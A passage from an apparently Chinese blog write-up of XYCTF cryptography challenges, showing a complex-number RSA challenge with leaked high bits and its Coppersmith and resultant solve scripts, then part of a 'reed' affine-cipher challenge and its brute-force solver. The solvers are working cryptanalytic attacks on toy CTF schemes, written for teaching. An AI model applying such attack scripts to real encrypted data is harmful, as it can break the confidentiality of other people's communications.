class="hljs-variable language_">self</span>.im * c.re<br>        <span class="hljs-keyword">return</span> Complex(re_, im_)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, c</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.re == c.re <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.im == c.im<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__rshift__</span>(<span class="hljs-params">self, m</span>):<br>        <span class="hljs-keyword">return</span> Complex(<span class="hljs-variable language_">self</span>.re &gt;&gt; m, <span class="hljs-variable language_">self</span>.im &gt;&gt; m)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__lshift__</span>(<span class="hljs-params">self, m</span>):<br>        <span class="hljs-keyword">return</span> Complex(<span class="hljs-variable language_">self</span>.re &lt;&lt; m, <span class="hljs-variable language_">self</span>.im &lt;&lt; m)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.im == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(<span class="hljs-variable language_">self</span>.re)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-variable language_">self</span>.re == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(<span class="hljs-variable language_">self</span>.im) == <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">if</span> self.im &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>&#125;</span>i&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.im&#125;</span>i&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;self.re&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;+&#x27;</span> <span class="hljs-keyword">if</span> self.im &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;-&#x27;</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-built_in">abs</span>(self.im)&#125;</span>i&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tolist</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable language_">self</span>.re, <span class="hljs-variable language_">self</span>.im]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">complex_pow</span>(<span class="hljs-params">c, exp, n</span>):<br>    result = Complex(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> exp &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> exp &amp; <span class="hljs-number">1</span>:                                             <span class="hljs-comment">#åˆ¤æ–­æ˜¯å¦æ˜¯å¥‡æ•°</span><br>            result = result * c<br>            result.re = result.re % n<br>            result.im = result.im % n<br>        c = c * c<br>        c.re = c.re % n<br>        c.im = c.im % n<br>        exp &gt;&gt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> result<br><br>bits = <span class="hljs-number">128</span>                                                      <span class="hljs-comment">#128bits</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>m = Complex(getRandomRange(<span class="hljs-number">1</span>, n), getRandomRange(<span class="hljs-number">1</span>, n))         <span class="hljs-comment">#å¤æ•°ï¼ŒComplex(re,im)</span><br>e = <span class="hljs-number">3</span><br>c = complex_pow(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;mh = <span class="hljs-subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;C = <span class="hljs-subst">&#123;c.tolist()&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;enc = <span class="hljs-subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="hljs-built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="hljs-string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span><br><span class="hljs-string">mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]</span><br><span class="hljs-string">C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]</span><br><span class="hljs-string">enc = b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>mçš„é«˜ä½æ³„éœ²ï¼Œä½†æ˜¯è¿™é‡Œçš„må’Œcéƒ½æ˜¯<strong>å¤æ•°</strong>ï¼Œåˆ†åˆ«ä»<strong>å®éƒ¨</strong>å’Œ<strong>è™šéƒ¨</strong>æ¥çœ‹<br>$m_{re} &#x3D; mh_{re} + x$<br>$m_{im} &#x3D; mh_{im} + y$<br>$C \equiv (m_{re}+m_{im})^3 \mod n$<br>$C \equiv m_{re}^3 + 3m_{re}m_{im}^2+3m_{re}^2m_{im}+m_{im}^3 \mod n$<br>$C_{re} \equiv (mh_{re}+x)^3-3(mh_{re}+x)(mh_{im}+y)^2$<br>$C_{im} \equiv -(mh_{im}+y)^3+3(mh_{im}+y)(mh_{im}+x)^2$<br>å†åˆ©ç”¨coppersmithå®šç†ï¼Œæ±‚å‡ºxï¼Œy</p><p><strong>ä»£ç ï¼š</strong></p><ul><li>æ–¹æ³•ä¸€ï¼šå¥—ç”¨äºŒå…ƒcoppersmithæ–¹æ³•è„šæœ¬</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20<br><br>n = <span class="hljs-number">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span><br>mh = [<span class="hljs-number">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span>, <span class="hljs-number">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span>]<br>C = [<span class="hljs-number">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span>, <span class="hljs-number">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span>]<br>enc = <span class="hljs-string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">small_roots</span>(<span class="hljs-params">f, bounds, m=<span class="hljs-number">1</span>, d=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> d:<br>        d = f.degree()<br><br>    R = f.base_ring()<br>    N = R.cardinality()<br><br>    f /= f.coefficients().pop(<span class="hljs-number">0</span>)<br>    f = f.change_ring(ZZ)<br><br>    G = <span class="hljs-type">Sequence</span>([], f.parent())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m + <span class="hljs-number">1</span>):<br>        base = N ^ (m - i) * f ^ i<br>        <span class="hljs-keyword">for</span> shifts <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(d), repeat=f.nvariables()):<br>            g = base * prod(<span class="hljs-built_in">map</span>(power, f.variables(), shifts))<br>            G.append(g)<br><br>    B, monomials = G.coefficients_monomials()<br>    monomials = vector(monomials)<br><br>    factors = [monomial(*bounds) <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> monomials]<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, factor)<br><br>    B = B.dense_matrix().LLL()<br><br>    B = B.change_ring(QQ)<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, <span class="hljs-number">1</span> / factor)<br><br>    H = <span class="hljs-type">Sequence</span>([], f.parent().change_ring(QQ))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, B * monomials):<br>        H.append(h)<br>        I = H.ideal()<br>        <span class="hljs-keyword">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            H.pop()<br>        <span class="hljs-keyword">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            roots = []<br>            <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> I.variety(ring=ZZ):<br>                root = <span class="hljs-built_in">tuple</span>(R(root[var]) <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f.variables())<br>                roots.append(root)<br>            <span class="hljs-keyword">return</span> roots<br><br>    <span class="hljs-keyword">return</span> []<br><br>R.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>f = (mh[<span class="hljs-number">0</span>] + x)^<span class="hljs-number">3</span> - <span class="hljs-number">3</span>*(mh[<span class="hljs-number">0</span>] + x)*(mh[<span class="hljs-number">1</span>] + y)^<span class="hljs-number">2</span> - C[<span class="hljs-number">0</span>]<br>bits = <span class="hljs-number">128</span><br>roots = small_roots(f,(<span class="hljs-number">2</span>^bits,<span class="hljs-number">2</span>^bits),m=<span class="hljs-number">2</span>,d=<span class="hljs-number">3</span>)<br><br>m_re=mh[<span class="hljs-number">0</span>] + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])<br>m_im=mh[<span class="hljs-number">1</span>] + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])<br>ans = ChaCha20.new(key=hashlib.sha256(<span class="hljs-built_in">str</span>(m_re + m_im).encode()).digest(), nonce=<span class="hljs-string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc)<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-comment">#b&#x27;XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/11YEAGER11/p/17269139.html">äºŒå…ƒcoppersmith - é¡¶çœŸçç  - åšå®¢å›­</a></p><ul><li>æ–¹æ³•äºŒï¼šåˆ©ç”¨<strong>ç»“å¼</strong>åˆ†åˆ«æ„é€ ä¸¤ä¸ªåªå«xï¼Œyå˜é‡çš„å¼å­ï¼Œå†ä½¿ç”¨ä¸€å…ƒcoppersmithæ–¹æ³•ã€‚</li></ul><p>å…³äºç»“å¼çš„ä»‹ç»å¯ä»¥çœ‹æˆ‘åšå®¢ï¼š<a href="https://ramoor.github.io/2025/04/02/%E7%BB%93%E5%BC%8F%E4%B8%8ERSA/">ç»“å¼ä¸RSA - Ramoor</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20<br><br>n = <span class="hljs-number">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span><br>mh = [<span class="hljs-number">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span>, <span class="hljs-number">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span>]<br>C = [<span class="hljs-number">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span>, <span class="hljs-number">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span>]<br>enc = <span class="hljs-string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span><br><br>R.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>f1 = (mh[<span class="hljs-number">0</span>] + x)^<span class="hljs-number">3</span> - <span class="hljs-number">3</span>*(mh[<span class="hljs-number">0</span>] + x)*(mh[<span class="hljs-number">1</span>] + y)^<span class="hljs-number">2</span> - C[<span class="hljs-number">0</span>]<br>f2 = <span class="hljs-number">3</span>*(mh[<span class="hljs-number">1</span>] + y)*(mh[<span class="hljs-number">0</span>] + x)^<span class="hljs-number">2</span> - (mh[<span class="hljs-number">1</span>] + y)^<span class="hljs-number">3</span> - C[<span class="hljs-number">1</span>]<br><br>h1 = f1.sylvester_matrix(f2, y).det()     <span class="hljs-comment">#åˆ©ç”¨ç»“å¼æ¶ˆæ‰y</span><br>h2 = f2.sylvester_matrix(f1, x).det() <br>x_roots = h1.univariate_polynomial().monic().small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">128</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)<span class="hljs-comment">#æ±‚å‡ºx</span><br>y_roots = h2.univariate_polynomial().monic().small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">128</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)<br><span class="hljs-built_in">print</span>(x_roots)<br><span class="hljs-built_in">print</span>(y_roots)<br><br>m_re = mh[<span class="hljs-number">0</span>] + <span class="hljs-built_in">int</span>(x_roots[<span class="hljs-number">0</span>])<br>m_im = mh[<span class="hljs-number">1</span>] + <span class="hljs-built_in">int</span>(y_roots[<span class="hljs-number">0</span>])<br><br>ans = ChaCha20.new(key=hashlib.sha256(<span class="hljs-built_in">str</span>(m_re + m_im).encode()).digest(), nonce=<span class="hljs-string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc)<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-comment">#b&#x27;XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="reed"><a href="#reed" class="headerlink" title="reed"></a>reed</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">assert</span> flag.startswith(<span class="hljs-string">&#x27;XYCTF&#123;&#x27;</span>) <span class="hljs-keyword">and</span> flag.endswith(<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br>flag = flag.rstrip(<span class="hljs-string">&#x27;&#125;&#x27;</span>).lstrip(<span class="hljs-string">&#x27;XYCTF&#123;&#x27;</span>)<br><br>table = string.ascii_letters + string.digits            <span class="hljs-comment">#å­—æ¯+æ•°å­—</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">all</span>(i <span class="hljs-keyword">in</span> table <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag)<br>r = random.Random()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PRNG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, seed</span>):<br>        <span class="hljs-variable language_">self</span>.a = <span class="hljs-number">1145140</span><br>        <span class="hljs-variable language_">self</span>.b = <span class="hljs-number">19198100</span><br>        random.seed(seed)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        x = random.randint(<span class="hljs-variable language_">self</span>.a, <span class="hljs-variable language_">self</span>.b)<br>        random.seed(x ** <span class="hljs-number">2</span> + <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> x<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">round</span>(<span class="hljs-params">self, k</span>):<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>            x = <span class="hljs-variable language_">self</span>.<span class="hljs-built_in">next</span>()<br>        <span class="hljs-keyword">return</span> x<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg, a, b</span>):<br>    c = [(a * table.index(m) + b) % <span class="hljs-number">19198111</span> <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> msg]<br>    <span class="hljs-keyword">return</span> c<br><br>seed = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;give me seed: &#x27;</span>))<br>prng = PRNG(seed)<br>a = prng.<span class="hljs-built_in">round</span>(r.randrange(<span class="hljs-number">2</span>**<span class="hljs-number">16</span>))<br>b = prng.<span class="hljs-built_in">round</span>(r.randrange(<span class="hljs-number">2</span>**<span class="hljs-number">16</span>))<br>enc = encrypt(flag, a, b)<br><span class="hljs-built_in">print</span>(enc)<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>ç»™äº†è®¸å¤šencåºåˆ—å’Œæ¨¡æ•°pï¼Œå³çŸ¥é“äº†<br>$C_i \equiv aI[m_i]+b \mod p$<br>å¯å¾—<br>$C_i-C_j\equiv a(I[m_i]-I[m_j])\mod p$<br>$a\equiv (C_i-C_j)(I[m_i]-I[m_j])\mod p$<br>$I[m_i]æŒ‡m_iåœ¨è¡¨tableä¸­å¯¹åº”çš„ç´¢å¼•ã€‚$<br>ç”±äºè¿™é‡Œçš„è¡¨tableåªåŒ…å«â€œå­—æ¯â€+â€œæ•°å­—â€ï¼ŒèŒƒå›´éå¸¸çš„å°ï¼ŒåŒæ—¶å¯†æ–‡åºåˆ—é•¿åº¦ä¹Ÿåªæœ‰36å·¦å³ï¼Œå› æ­¤å¯ä»¥ç›´æ¥çˆ†ç ´ã€‚<br>çˆ†ç ´æˆåŠŸçš„æ¡ä»¶è®¾ä¸º</p><ul><li>$1145140 \leq a \leq 19198100$</li><li>$1145140 \leq b \leq 19198100$</li><li>$all(m_i &lt; len(table))$<br><strong>ä»£ç ï¼š</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>table = string.ascii_letters + string.digits<br>p = <span class="hljs-number">19198111</span><br><br>enc=[<span class="hljs-number">8622166</span>, <span class="hljs-number">8622166</span>, <span class="hljs-number">1642584</span>, <span class="hljs-number">5715427</span>, <span class="hljs-number">8622166</span>, <span class="hljs-number">1642584</span>, <span class="hljs-number">5106812</span>, <span class="hljs-number">17325341</span>, <span class="hljs-number">1625542</span>, <span class="hljs-number">1033969</span>, <span class="hljs-number">16159237</span>, <span class="hljs-number">7439020</span>, <span class="hljs-number">3366177</span>, <span class="hljs-number">17325341</span>, <span class="hljs-number">18491445</span>, <span class="hljs-number">4532281</span>, <span class="hljs-number">17325341</span>, <span class="hljs-number">459438</span>, <span class="hljs-number">459438</span>, <span class="hljs-number">3366177</span>, <span class="hljs-number">16159237</span>, <span class="hljs-number">3940708</span>, <span 